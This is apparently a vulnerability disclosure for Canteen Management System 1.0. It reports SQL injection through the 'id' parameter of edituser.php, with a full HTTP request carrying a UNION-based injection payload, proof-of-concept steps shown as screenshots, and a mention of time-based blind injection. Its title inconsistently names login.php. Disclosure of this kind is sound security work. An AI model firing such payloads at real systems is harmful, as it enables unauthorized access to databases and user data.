# Canteen Management System - edituser.php 'id' SQL inject

#### Exploit Title: Canteen Management System - login.php 'id' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

#### Software Link:https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

#### Version: Canteen Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Canteen Management System does not filter the content correctly at the "edituser.php /id" parameter, resulting in the generation of SQL injection.

#### Payload used:

```
GET /edituser.php?id=-7956'%20UNION%20ALL%20SELECT%20NULL,md5(1),NULL,NULL--+ HTTP/1.1
Host: 192.168.67.10:8091
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.67.10:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.67.10:8091/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

#### Proof of Concept

1、After logging in, use the Edit User function

![image](https://github.com/joinia/webray.com.cn/blob/main/youthappam/images/edituserhtml.png)

2、Looking at the source code, it is found that the id field is directly brought into the SQL statement query without filtering

![image](https://github.com/joinia/webray.com.cn/blob/main/youthappam/images/editusersouce.png)



3、

![image](https://github.com/joinia/webray.com.cn/blob/main/youthappam/images/edituserburp.png)

4、The results can be directly echoed on the page by constructing correct SQL statements

![image](https://github.com/joinia/webray.com.cn/blob/main/youthappam/images/edituserresult.png)

5、Through testing with the tool, it is found that there are other injection methods such as blind SQL time injection.

![image](https://github.com/joinia/webray.com.cn/blob/main/youthappam/images/images\editusersqlmap.png)

